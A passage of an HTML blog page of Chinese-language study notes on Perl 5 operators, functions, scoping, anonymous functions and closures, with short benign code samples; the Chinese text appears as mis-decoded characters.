title="å‚æ•°æ•°é‡"></a>å‚æ•°æ•°é‡</h3><p>æ“ä½œç¬¦çš„å‚æ•°æ•°é‡å°±æ˜¯è¯¥æ“ä½œç¬¦æ‰€ä½œç”¨çš„æ“ä½œæ•°çš„ä¸ªæ•°.</p><h3 id="è¯ç¼€æ€§"><a href="#è¯ç¼€æ€§" class="headerlink" title="è¯ç¼€æ€§"></a>è¯ç¼€æ€§</h3><p>æ“ä½œç¬¦çš„è¯ç¼€æ€§å°±æ˜¯å®ƒç›¸å¯¹å…¶æ“ä½œæ•°çš„ä½ç½®:</p><ul><li>ä¸­ç¼€æ“ä½œç¬¦, å‡ºç°åœ¨æ“ä½œæ•°ä¹‹é—´, å¦‚ <code>$length * $width</code></li><li>å‰ç¼€æ“ä½œç¬¦, å‡ºç°åœ¨å…¶æ“ä½œæ•°ä¹‹å‰. å¦‚ <code>-$x</code></li><li>åç¼€æ“ä½œç¬¦, å‡ºç°åœ¨å…¶æ“ä½œæ•°ä¹‹å. å¦‚ <code>$z++</code></li><li>ç¯ç¼€æ“ä½œç¬¦, åŒ…å›´å…¶æ“ä½œæ•°, å¦‚ <code>&#123; ... &#125;</code></li><li>åç¯ç¼€æ“ä½œç¬¦, æ¥è½½æŸäº›æ“ä½œæ•°ä¹‹åå¹¶å›´ç»•å…¶ä»–éƒ¨åˆ†, å¦‚ <code>$hash&#123; ... &#125;</code></li></ul><h2 id="æ“ä½œç¬¦ç±»å‹"><a href="#æ“ä½œç¬¦ç±»å‹" class="headerlink" title="æ“ä½œç¬¦ç±»å‹"></a>æ“ä½œç¬¦ç±»å‹</h2><h3 id="æ•°å€¼æ“ä½œç¬¦"><a href="#æ•°å€¼æ“ä½œç¬¦" class="headerlink" title="æ•°å€¼æ“ä½œç¬¦"></a>æ•°å€¼æ“ä½œç¬¦</h3><p>æ•°å€¼æ“ä½œç¬¦å¯¹å…¶æ“ä½œæ•°å¼ºåˆ¶æ•°å€¼ä¸Šä¸‹æ–‡.</p><ul><li><code>+</code></li><li><code>-</code></li><li><code>*</code></li><li><code>/</code></li><li><code>**</code></li><li><code>%</code></li><li><code>+=</code>, <code>-=</code>, <code>*=</code>, <code>/=</code>, <code>**=</code>, <code>%=</code> </li><li><code>--</code></li></ul><p>è‡ªå¢æ“ä½œç¬¦ <code>++</code>, æœ‰ç‰¹æ®Šçš„å­—ç¬¦ä¸²è¡Œä¸º.</p><p>è‹¥å¹²æ¯”è¾ƒæ“ä½œç¬¦:<br><code>==</code>, <code>!=</code>, <code>&gt;</code>, <code>&lt;</code>, <code>&gt;=</code>, <code>&lt;=</code>, <code>&lt;=&gt;</code>, </p><h3 id="å­—ç¬¦ä¸²æ“ä½œç¬¦"><a href="#å­—ç¬¦ä¸²æ“ä½œç¬¦" class="headerlink" title="å­—ç¬¦ä¸²æ“ä½œç¬¦"></a>å­—ç¬¦ä¸²æ“ä½œç¬¦</h3><p>å­—ç¬¦ä¸²æ“ä½œç¬¦å¯¹å…¶æ“ä½œæ•°å¼ºåˆ¶å­—ç¬¦ä¸²ä¸Šä¸‹æ–‡.</p><ul><li><code>=~</code></li><li><code>!~</code></li><li><code>.</code></li></ul><p>è‹¥å¹²æ¯”è¾ƒæ“ä½œç¬¦:<br><code>eq</code>, <code>ne</code>, <code>gt</code>, <code>lt</code>, <code>ge</code>, <code>le</code>, <code>cmp</code>, </p><h3 id="é€»è¾‘æ“ä½œç¬¦"><a href="#é€»è¾‘æ“ä½œç¬¦" class="headerlink" title="é€»è¾‘æ“ä½œç¬¦"></a>é€»è¾‘æ“ä½œç¬¦</h3><p>é€»è¾‘æ“ä½œç¬¦åœ¨å¸ƒå°”ä¸Šä¸‹æ–‡ä¸­å¤„ç†æ“ä½œæ•°.</p><ul><li><code>&amp;&amp;</code> å’Œ <code>and</code></li><li><code>||</code> å’Œ <code>or</code></li></ul><p>éƒ½ä¸º <mark>çŸ­è·¯æµ‹è¯•</mark> </p><p><mark>å·²å®šä¹‰-æˆ–</mark> æ“ä½œç¬¦, <code>//</code>, æµ‹è¯•å…¶æ“ä½œç¬¦çš„å®šä¹‰æ€§, åœ¨è®¾ç½®é»˜è®¤å€¼æ—¶æœ‰ç”¨.</p><p><code>!</code> å’Œ <code>not</code> è¿”å›å…¶æ“ä½œæ•°çš„é€»è¾‘åå€¼. <code>not</code> çš„ä¼˜å…ˆçº§æ¯” <code>!</code> ä½.</p><p><code>?:</code>, <code>xor</code>.</p><h3 id="æŒ‰ä½æ“ä½œç¬¦"><a href="#æŒ‰ä½æ“ä½œç¬¦" class="headerlink" title="æŒ‰ä½æ“ä½œç¬¦"></a>æŒ‰ä½æ“ä½œç¬¦</h3><ul><li><code>&lt;&lt;</code></li><li><code>&gt;&gt;</code></li><li><code>&amp;</code></li><li><code>|</code></li><li><code>^</code></li><li><code>&amp;=</code>, <code>|=</code>, <code>^=</code>, <code>&lt;&lt;=</code>, <code>&gt;&gt;=</code></li></ul><h3 id="ç‰¹æ®Šæ“ä½œç¬¦"><a href="#ç‰¹æ®Šæ“ä½œç¬¦" class="headerlink" title="ç‰¹æ®Šæ“ä½œç¬¦"></a>ç‰¹æ®Šæ“ä½œç¬¦</h3><p>è‡ªå¢æ“ä½œç¬¦:</p><ul><li>åœ¨æ•°å€¼ä¸Šä¸‹æ–‡ä¸­ä½¿ç”¨åˆ™å¢åŠ æ•°å€¼éƒ¨åˆ†</li><li>å¦‚æœè¿™ä¸ªå˜é‡æ˜æ˜¾åœ°æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸², åˆ™æ­¤å­—ç¬¦ä¸²å°†ä¼š <code>å¸¦è¿›ä½</code> åœ°è‡ªå¢, å¦‚ <code>zz</code> å¢ä¸º <code>aaa</code></li></ul><p>é‡å¤æ“ä½œç¬¦ <code>x</code>.</p><p>èŒƒå›´æ“ä½œç¬¦ <code>..</code></p><p>é€—å·æ“ä½œç¬¦ <code>,</code></p><p>èƒ–é€—å·æ“ä½œç¬¦ <code>=&gt;</code></p><h1 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h1><h2 id="åˆ«å"><a href="#åˆ«å" class="headerlink" title="åˆ«å"></a>åˆ«å</h2><p>ä¸€ä¸ª <code>@_</code> çš„æœ‰ç”¨ç‰¹æ€§, å…¶åŒ…å«äº†ä¼ å…¥å‚æ•°çš„åˆ«å, å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">Test</span> </span>&#123;<br>    $_[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;The value is changed..&#x27;</span>;<br>&#125;<br><br><span class="hljs-keyword">my</span> $test = <span class="hljs-string">&#x27;haha&#x27;</span>;<br>Test($test);<br><br><span class="hljs-keyword">say</span> $test;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œ <code>$_[0]</code> æˆäº† <code>$test</code> çš„åˆ«å.</p><h2 id="åç§°ç©ºé—´"><a href="#åç§°ç©ºé—´" class="headerlink" title="åç§°ç©ºé—´"></a>åç§°ç©ºé—´</h2><p>æ¯ä¸€ä¸ªå‡½æ•°å­˜åœ¨äºæŸåç§°ç©ºé—´ä¸­, ä½äºæœªå£°æ˜åç§°ç©ºé—´ä¸­çš„å‡½æ•°, å³æ²¡æœ‰åœ¨ä¸€æ¡æ˜ç¡®çš„ <code>package ...</code> è¯­å¥ä¹‹åå£°æ˜çš„å‡½æ•°, å­˜åœ¨äº <code>main</code> åç§°ç©ºé—´. å¯ä»¥åœ¨å£°æ˜æ—¶ä¸ºå‡½æ•°æŒ‡å®šå½“å‰ä¹‹å¤–çš„åç§°ç©ºé—´:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">Extension</span>::<span class="hljs-title">Math</span>::<span class="hljs-title">add</span> </span>&#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>å¦‚æœå‘æ›¿æ¢ä¸€ä¸ªå·²ç»å­˜åœ¨çš„å‡½æ•°, å¯ä»¥é€šè¿‡ <code>no warnings &#39;redefine&#39;</code> æ¥ç¦ç”¨è¿™ç±»è­¦å‘Š.</p><h3 id="å¯¼å…¥"><a href="#å¯¼å…¥" class="headerlink" title="å¯¼å…¥"></a>å¯¼å…¥</h3><p>å½“ä½¿ç”¨ <code>use</code> å…³é”®å­—åŠ è½½æ¨¡å—æ—¶, Perl è‡ªåŠ¨è°ƒç”¨æ‰€æä¾›æ¨¡å—çš„ <code>import()</code> æ–¹æ³• (å¯è‡ªå·±å®šä¹‰), ä»¥ä½¿éƒ¨åˆ†æˆ–å…¨éƒ¨ç»è¿‡å®šä¹‰çš„ç¬¦å·åœ¨è°ƒç”¨è€…çš„åç§°ç©ºé—´ä¸­å¯ç”¨.</p><p>æ‰€æœ‰ <code>use</code> è¯­å¥å†…æ¨¡å—ååçš„å‚æ•°ä¼šä¼ é€’ç»™æ¨¡å—çš„ <code>import()</code> æ–¹æ³•:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> strict <span class="hljs-string">&#x27;refs&#x27;</span>;<br></code></pre></td></tr></table></figure><p>åŠ è½½ <code>strict.pm</code> æ¨¡å—, è°ƒç”¨ <code>strict-&gt;import( &#39;refs&#39; )</code>.</p><p>ä¹Ÿç­‰ä»·äº:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl">BEGIN<br>&#123;<br>    <span class="hljs-keyword">require</span> strict;<br>    strict-&gt;import( <span class="hljs-string">&#x27;refs&#x27;</span> );<br>    strict-&gt;import( <span class="hljs-string">qw( subs vars )</span> );<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥çœ‹å‡º, <code>require</code> åªæ˜¯åŠ è½½æ¨¡å—, ä¸å¯¼å…¥ä»»ä½•åç§°.</p><h2 id="æŠ¥å‘Šé”™è¯¯"><a href="#æŠ¥å‘Šé”™è¯¯" class="headerlink" title="æŠ¥å‘Šé”™è¯¯"></a>æŠ¥å‘Šé”™è¯¯</h2><p>åœ¨å‡½æ•°ä¹‹å†…, å¯ä»¥é€šè¿‡ <code>caller</code> æ“ä½œç¬¦å¾—åˆ°æœ‰å…³æœ¬æ¬¡è°ƒç”¨çš„ä¸Šä¸‹æ–‡ä¿¡æ¯, å¦‚æœä¸åŠ å‚æ•°, å…¶è¿”å›ä¸‰ä¸ªå…ƒç´ çš„åˆ—è¡¨, åŒ…æ‹¬:</p><ul><li>è°ƒç”¨åŒ…çš„åç§°</li><li>æœ¬æ¬¡è°ƒç”¨çš„æ–‡ä»¶å</li><li>è°ƒç”¨å‘ç”Ÿçš„åŒ…å†…è¡Œå·</li></ul><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">package</span> main;<br><br>main();<br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">main</span> </span>&#123;<br>    show_call_information();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">show_call_information</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">my</span> ($package, $file, $line) = <span class="hljs-keyword">caller</span>();<br>    <span class="hljs-keyword">say</span> <span class="hljs-string">&quot;Called from $package in $file at $line&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥å‘ <code>caller()</code> ä¼ é€’å•ä¸ªå¯é€‰çš„æ•´æ•°å‚æ•°, è¿™æ ·, Perl å°†æŒ‰ç»™å‡ºçš„å±‚æ•°å›æŸ¥è°ƒç”¨è€…çš„è°ƒç”¨è€…çš„è°ƒç”¨è€…, å¹¶æä¾›è¯¥æ¬¡è°ƒç”¨çš„ç›¸å…³ä¿¡æ¯. å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">show_call_information</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">my</span> ($package, $file, $line, $func) = <span class="hljs-keyword">caller</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">say</span> <span class="hljs-string">&quot;Called $func from $package in $file at $line&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="éªŒè¯å‚æ•°"><a href="#éªŒè¯å‚æ•°" class="headerlink" title="éªŒè¯å‚æ•°"></a>éªŒè¯å‚æ•°</h2><p>å¯ä»¥é€šè¿‡åœ¨æ ‡é‡ä¸Šä¸‹æ–‡ä¸­å¯¹ <code>@_</code> æ±‚å€¼æ¥æ£€æŸ¥ä¼ é€’ç»™å‡½æ•°çš„å‚æ•°ä¸ªæ•°æ˜¯å¦æ­£ç¡®:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">add_numbers</span> </span>&#123;<br>    croak <span class="hljs-string">&quot;Expected two numbers, but received: &quot;</span> . @_<br>        <span class="hljs-keyword">unless</span> @_ == <span class="hljs-number">2</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="é«˜çº§å‡½æ•°"><a href="#é«˜çº§å‡½æ•°" class="headerlink" title="é«˜çº§å‡½æ•°"></a>é«˜çº§å‡½æ•°</h2><h3 id="ä¸Šä¸‹æ–‡è®¤çŸ¥"><a href="#ä¸Šä¸‹æ–‡è®¤çŸ¥" class="headerlink" title="ä¸Šä¸‹æ–‡è®¤çŸ¥"></a>ä¸Šä¸‹æ–‡è®¤çŸ¥</h3><p>Perl 5 å†…ç½®å‡½æ•°äº†è§£ä½ æ˜¯åœ¨ç©º, æ ‡é‡, è¿˜æ˜¯åˆ—è¡¨ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä»–ä»¬.</p><p><code>wantarray</code> å…³é”®å­—:</p><ul><li>è¿”å› <code>undef</code> è¡¨ç¤ºç©ºä¸Šä¸‹æ–‡</li><li>è¿”å›å‡å€¼è¡¨ç¤ºæ ‡é‡ä¸Šä¸‹æ–‡</li><li>è¿”å›çœŸå€¼è¡¨æ˜åˆ—è¡¨ä¸Šä¸‹æ–‡</li></ul><p>å¦‚</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">context_sensitive</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $context = <span class="hljs-keyword">wantarray</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">qw( Called in list context )</span>  <span class="hljs-keyword">if</span>             $context;<br>    <span class="hljs-keyword">say</span>       <span class="hljs-string">&#x27;Called in void context&#x27;</span>   <span class="hljs-keyword">unless</span> <span class="hljs-keyword">defined</span> $context;<br>    <span class="hljs-keyword">return</span>    <span class="hljs-string">&#x27;Called in scalar context&#x27;</span> <span class="hljs-keyword">unless</span>         $context;<br>&#125;    <br><br>context_sensitive();<br><span class="hljs-keyword">say</span> <span class="hljs-keyword">my</span> $scalar = context_sensitive();<br><span class="hljs-keyword">say</span> context_sensitive();<br></code></pre></td></tr></table></figure><h3 id="é€’å½’"><a href="#é€’å½’" class="headerlink" title="é€’å½’"></a>é€’å½’</h3><p>åœ¨ Perl ä¸­æ¯ä¸€æ¬¡å‡½æ•°è°ƒç”¨éƒ½åˆ›å»ºä¸€ä¸ªæ–°çš„ <mark>è°ƒç”¨å¸§</mark> . è¿™æ˜¯ä¸€ç§ä»£è¡¨è°ƒç”¨æœ¬èº«çš„å†…éƒ¨æ•°æ®ç»“æ„: ä¼ å…¥å‚æ•°, è¿”å›ç‚¹, æ­¥å…¥æ­¤è°ƒç”¨ç‚¹å‰çš„æ‰€æœ‰ç¨‹åºæ§åˆ¶æµç¨‹.</p><p>æ³¨æ„å…ˆç»™å‡ºç»“æŸé€’å½’çš„æ¡ä»¶.</p><h3 id="è¯æ³•ç›¸å…³"><a href="#è¯æ³•ç›¸å…³" class="headerlink" title="è¯æ³•ç›¸å…³"></a>è¯æ³•ç›¸å…³</h3><p>æ¯ä¸€æ¬¡å¯¹å‡½æ•°çš„æ–°è°ƒç”¨ä¼šåˆ›å»ºè‡ªç”Ÿè¯æ³•ä½œç”¨åŸŸçš„å®ä¾‹.</p><h3 id="å°¾éƒ¨è°ƒç”¨"><a href="#å°¾éƒ¨è°ƒç”¨" class="headerlink" title="å°¾éƒ¨è°ƒç”¨"></a>å°¾éƒ¨è°ƒç”¨</h3><p>é€’å½’çš„ä¸€ä¸ªç¼ºç‚¹å°±æ˜¯å¿…é¡»å°†è¿”å›æ¡ä»¶ç¼–å†™æ­£ç¡®.</p><p>Perl æ£€æµ‹åˆ°å¤±æ§çš„é€’å½’æ—¶, æä¾›çš„è­¦å‘Šä¸º <code>Deep recursion on subroutine</code>. é™åˆ¶æ˜¯ 100 æ¬¡é€’å½’è°ƒç”¨, å¯ä»¥é€šè¿‡é€’å½’è°ƒç”¨ä½œç”¨åŸŸå†…é€šè¿‡ <code>no warning &#39;recursion&#39;</code> æ¥ç¦ç”¨è¿™ä¸€è­¦å‘Š.</p><p><mark>å°¾éƒ¨è°ƒç”¨</mark> å°±æ˜¯è°ƒç”¨ä¸€ä¸ªå‡½æ•°ç„¶åç›´æ¥è¿”å›è¿™ä¸ªå‡½æ•°çš„ç»“æœ.</p><p><mark>å°¾éƒ¨è°ƒç”¨æ¶ˆé™¤</mark> çš„ç‰¹æ€§å¯ä»¥è§£å†³é«˜åº¦é€’å½’ä»£ç åˆ›å»ºæ–°è°ƒç”¨å¸§å’Œå­˜å‚¨è¯æ³•å˜é‡å€¼é€ æˆçš„å†…å­˜ä½¿ç”¨è¿‡é«˜é—®é¢˜. (å› ä¸ºç›´æ¥è¿”å›å‡½æ•°çš„ç»“æœ)</p><p>å¯ä½¿ç”¨ <code>Sub::Call::Tail</code> æ¨¡å—ç”¨ <code>tail</code> ä»£æ›¿ <code>return</code>.</p><h2 id="ç¼ºé™·å’Œè®¾è®¡å¤±è¯¯"><a href="#ç¼ºé™·å’Œè®¾è®¡å¤±è¯¯" class="headerlink" title="ç¼ºé™·å’Œè®¾è®¡å¤±è¯¯"></a>ç¼ºé™·å’Œè®¾è®¡å¤±è¯¯</h2><p>Perl 5 ä»æ”¯æŒæ—§å¼å‡½æ•°è°ƒç”¨, å‰æœŸç‰ˆæœ¬çš„ Perl è¦æ±‚ç”¨å‰ç½®çš„ <code>&amp;</code> å­—ç¬¦è°ƒç”¨å‡½æ•°, Perl 1 è¦æ±‚ä½¿ç”¨ <code>do</code> å…³é”®å­—.</p><p>å‰ç½® <code>&amp;</code> å½¢å¼åœ¨ä½ ä¸æ˜ç¡®åœ°ä¼ é€’å‚æ•°æ—¶, ä¼šéšå¼åœ°å°† <code>@_</code> çš„å†…å®¹ä¸åŠ ä¿®æ”¹åœ°ä¼ ç»™å‡½æ•°. (è¿™é‡Œä¸èƒ½åŠ æ‹¬å·, ä¸ç„¶ä¸ä¼šä¼ é€’, åŠ äº†æ‹¬å·è²Œä¼¼å°±æ˜¯ä¼ é€’ç©ºå‚æ•°)</p><h2 id="ä½œç”¨åŸŸ"><a href="#ä½œç”¨åŸŸ" class="headerlink" title="ä½œç”¨åŸŸ"></a>ä½œç”¨åŸŸ</h2><p>åœ¨ Perl ä¸­, ä»»ä½•æœ‰åå­—çš„äº‹ç‰©éƒ½æœ‰ä½œç”¨åŸŸ.</p><h3 id="è¯æ³•ä½œç”¨åŸŸ"><a href="#è¯æ³•ä½œç”¨åŸŸ" class="headerlink" title="è¯æ³•ä½œç”¨åŸŸ"></a>è¯æ³•ä½œç”¨åŸŸ</h3><p>Perl ç¼–è¯‘å™¨åœ¨ç¼–è¯‘æœŸè§£å†³æ­¤ç±»ä½œç”¨åŸŸ.</p><p>è¦ <mark>åˆ›å»ºä¸€ä¸ªæ–°çš„è¯æ³•ä½œç”¨åŸŸ</mark> å¯ä»¥ç¼–å†™ä¸€ä¸ªç”±å¤§æ‹¬å·åˆ†éš”çš„ä»£ç å—. (è¿™ä¸ªä»£ç å—å¯ä»¥æ˜¯ä¸€ä¸ªè£¸å—, æˆ–å¾ªç¯ç»“æ„ä¸»ä½“ä¸­çš„å—, ä¸€ä¸ª eval å—æˆ–æ˜¯å…¶ä»–æ²¡æœ‰ç”¨å¼•å·å¼•èµ·çš„å—)</p><p>è¯æ³•ä½œç”¨åŸŸ <mark>ç®¡ç†ç”± <code>my</code> å£°æ˜çš„å˜é‡çš„å¯è§æ€§</mark> , è¿™äº›å˜é‡è¢«ç§°ä½œè¯æ³•å˜é‡.</p><h3 id="åŠ¨æ€ä½œç”¨åŸŸ"><a href="#åŠ¨æ€ä½œç”¨åŸŸ" class="headerlink" title="åŠ¨æ€ä½œç”¨åŸŸ"></a>åŠ¨æ€ä½œç”¨åŸŸ</h3><p>åŠ¨æ€ä½œç”¨åŸŸåœ¨å¯è§æ€§è§„åˆ™ä¸Šç±»ä¼¼äºè¯æ³•ä½œç”¨åŸŸ, å’Œåœ¨ç¼–è¯‘å™¨ç¡®å®šä½œç”¨åŸŸç›¸å, ç¡®å®šä½œç”¨åŸŸçš„è¿‡ç¨‹æ²¿ç€è°ƒç”¨ä¸Šä¸‹æ–‡å‘ç”Ÿ.</p><p><mark>è¯æ³•å˜é‡</mark>è¢«å­˜æ”¾åœ¨é™„ç€äºä½œç”¨åŸŸçš„ <mark>è¯æ³•æ¿</mark> ä¸­, æ¯æ¬¡è¿›å…¥åˆ°è¯æ³•ä½œç”¨åŸŸä¸­éƒ½éœ€è¦ Perl æ¥åˆ›å»ºä¸€ä¸ªåŒ…å«å˜é‡å€¼çš„æ–°çš„ä¸“å±è¯æ³•æ¿.</p><p><mark>åŒ…å˜é‡</mark> çš„å­˜å‚¨æœºåˆ¶ç§°ä¸ºç¬¦å·è¡¨. æ¯ä¸ªåŒ…éƒ½æœ‰ä¸€ä¸ªå•ç‹¬çš„ç¬¦å·è¡¨, å¹¶ä¸”æ¯ä¸ªåŒ…å˜é‡åœ¨å…¶ä¸­å æœ‰ä¸€ä¸ªæ¡ç›®. <code>local</code> åªèƒ½å±€éƒ¨åŒ–å…¨å±€å’ŒåŒ…å˜é‡è€Œéè¯æ³•å˜é‡.</p><p>ç”¨ <code>local</code> å±€éƒ¨åŒ–è‹¥å¹²ç¥å¥‡å˜é‡çš„åšæ³•å¾ˆå¸¸è§.</p><h3 id="â€œStateâ€-ä½œç”¨åŸŸ"><a href="#â€œStateâ€-ä½œç”¨åŸŸ" class="headerlink" title="â€œStateâ€ ä½œç”¨åŸŸ"></a>â€œStateâ€ ä½œç”¨åŸŸ</h3><p><code>state</code> å…³é”®å­—, å£°æ˜ä¸€ä¸ªè¯æ³•å˜é‡, ä½†æ˜¯è¯¥å˜é‡åªåˆå§‹åŒ–ä¸€æ¬¡, éšåä¸€ç›´ä¿æŒ.</p><h2 id="åŒ¿åå‡½æ•°"><a href="#åŒ¿åå‡½æ•°" class="headerlink" title="åŒ¿åå‡½æ•°"></a>åŒ¿åå‡½æ•°</h2><p>åŒ¿åå‡½æ•°æ²¡æœ‰ Perl å¯ä»¥è¯†åˆ«çš„åç§°.</p><p>CPAN æ¨¡å— <code>Sub::Identify</code> æä¾›äº†ä¸€ç³»åˆ—æœ‰ç”¨çš„å‡½æ•°æ¥å¯¹<mark>ä¼ å…¥å‡½æ•°å¼•ç”¨</mark>çš„åç§°è¿›è¡Œæ£€æŸ¥. å¦‚ <code>sub_name()</code>:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Sub::Identify <span class="hljs-string">&#x27;sub_name&#x27;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">main</span> </span>&#123;<br>    <span class="hljs-keyword">say</span> sub_name( \&amp;main );<br>    <span class="hljs-keyword">say</span> sub_name( <span class="hljs-function"><span class="hljs-keyword">sub</span> </span>&#123;&#125; );<br>&#125;<br><br>main();<br></code></pre></td></tr></table></figure><p>CPAN æ¨¡å— <code>Sub::Name</code> çš„ <code>subname()</code> å‡½æ•°å…è®¸å°†åç§°é™„åŠ åœ¨åŒ¿åå‡½æ•°ä¸Š:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Sub::Name;<br><span class="hljs-keyword">use</span> Sub::Identify <span class="hljs-string">&#x27;sub_name&#x27;</span>;<br><br><span class="hljs-keyword">my</span> $anon = <span class="hljs-function"><span class="hljs-keyword">sub</span> </span>&#123;&#125;;<br><span class="hljs-keyword">say</span> sub_name( $anon );<br><br><span class="hljs-keyword">my</span> $named = subname( <span class="hljs-string">&#x27;pseudo-anonymous&#x27;</span>, $anon );<br><span class="hljs-keyword">say</span> sub_name( $named );<br><span class="hljs-keyword">say</span> sub_name( $anon );<br><br><span class="hljs-keyword">say</span> sub_name( <span class="hljs-function"><span class="hljs-keyword">sub</span> </span>&#123;&#125; );<br></code></pre></td></tr></table></figure><h3 id="éšå¼åŒ¿åå‡½æ•°"><a href="#éšå¼åŒ¿åå‡½æ•°" class="headerlink" title="éšå¼åŒ¿åå‡½æ•°"></a>éšå¼åŒ¿åå‡½æ•°</h3><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Test::More <span class="hljs-string">tests =&gt;</span> <span class="hljs-number">2</span>;<br><span class="hljs-keyword">use</span> Test::Exception;<br><br>throws_ok &#123; <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;I croak!&quot;</span> &#125;<br>    qr/I croak/, <span class="hljs-string">&#x27;die() should throw an exception&#x27;</span>;<br><br>lives_ok  &#123; <span class="hljs-number">1</span> + <span class="hljs-number">1</span> &#125;<br>    <span class="hljs-string">&#x27;simple addition should not&#x27;</span>;<br></code></pre></td></tr></table></figure><p><code>throws_ok</code> çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªåŒ¿åå‡½æ•°, è€Œè¿™é‡Œçœç•¥äº† <code>sub &#123;&#125;</code></p><h2 id="é—­åŒ…"><a href="#é—­åŒ…" class="headerlink" title="é—­åŒ…"></a>é—­åŒ…</h2><p>å¯åœ¨ <a href="http://hop.perl.plover.com/"><code>http://hop.perl.plover.com/</code></a>  åœ¨çº¿é˜…è¯» Higher Order Perl.</p><p>é—­åŒ…æ˜¯ <mark>å°é—­äºå¤–éƒ¨è¯æ³•ç¯å¢ƒä¹‹ä¸Šçš„</mark> , å‡½æ•°.</p><h2 id="çŠ¶æ€-VS-é—­åŒ…"><a href="#çŠ¶æ€-VS-é—­åŒ…" class="headerlink" title="çŠ¶æ€ VS é—­åŒ…"></a>çŠ¶æ€ VS é—­åŒ…</h2><p>åœ¨å¯èƒ½æ—¶ä½¿ç”¨ <code>state</code> ä»£æ›¿, å¦åˆ™ä½¿ç”¨é—­åŒ….</p><h2 id="å±æ€§"><a href="#å±æ€§" class="headerlink" title="å±æ€§"></a>å±æ€§</h2><p>Perl ä¸­çš„å…·åå®ä½“ (å˜é‡å’Œå‡½æ•°) å¯æŒ‰å±æ€§çš„å½¢å¼é™„åŠ é¢å¤–çš„å…ƒä¿¡æ¯.</p><p><mark>å±æ€§</mark> æ˜¯åç§° (é€šå¸¸, ä¹Ÿæ˜¯å€¼).</p><h3 id="ä½¿ç”¨å±æ€§"><a href="#ä½¿ç”¨å±æ€§" class="headerlink" title="ä½¿ç”¨å±æ€§"></a>ä½¿ç”¨å±æ€§</h3><p>æœ€ç®€å•çš„å½¢å¼: å±æ€§æ˜¯ä¸€ä¸ªé™„åŠ 